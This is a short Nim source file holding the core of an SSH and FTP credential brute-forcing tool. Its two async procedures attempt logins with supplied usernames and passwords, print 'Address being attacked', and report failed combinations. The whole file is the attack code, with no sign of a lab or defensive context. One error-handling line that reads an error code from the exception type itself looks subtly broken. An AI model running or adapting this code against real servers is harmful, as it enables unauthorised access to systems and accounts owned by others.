import asyncdispatch, ssh2, ssh2/scp, asyncfutures, asyncftpclient, std/parseopt, strutils, sequtils

 
 
 
 
proc ssh_bruteforce*(address: string,  username: string, port: Port, password: string): Future[bool] {.async.} =
        echo "Address being attacked: ", address
        echo "Username used: ", username
        echo "Password: ", password
        var client = newSSHClient()
        defer: client.disconnect()

        try:
            var connection = client.connect(address, username, port, password, "", "", false)
            await connection 
            return true
        except AuthenticationException:
            echo "Combination: ", username, " and password: ", password, " failed."
            return false
        except OSError:
            echo "Error handling proc. Error code: ", OSError.errorCode
            return false
    

proc ftp_bruteforce*(address: string, user: string, password: string, port: Port): Future[bool] {.async.} =
        var ftp = newAsyncFtpClient(address, port, user = user, pass = password)
        try:
            await ftp.connect
            return true
        except AuthenticationException:
            echo "Combination: ", user, " and password: ", password, " failed."
            return false
        except OSError:
            echo "Error handling proc"
            return false
    